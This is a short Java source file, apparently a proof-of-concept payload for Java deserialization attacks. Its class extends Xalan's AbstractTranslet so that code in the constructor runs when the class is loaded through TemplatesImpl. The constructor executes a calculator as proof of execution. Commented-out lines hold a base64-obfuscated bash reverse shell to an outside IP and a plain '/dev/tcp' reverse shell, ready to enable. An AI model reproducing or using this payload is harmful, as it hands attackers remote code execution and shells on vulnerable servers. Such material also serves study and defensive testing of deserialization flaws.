import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class HelloTempImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public HelloTempImpl() throws IOException {
        super();
        System.out.println("Hello TemplatesImpl");
//        Runtime.getRuntime().exec(new String[]{"cmd","/c","D:\\Genshin\" \"Impact\\Genshin\" \"Impact\" \"Game\\YuanShen.exe"});
//        Runtime.getRuntime().exec("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ1LjE1Ni4xNjMvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}'");
        Runtime.getRuntime().exec("gnome-calculator");
//        bash -i >& /dev/tcp/192.168.2.16/9999 0>&1
    }
}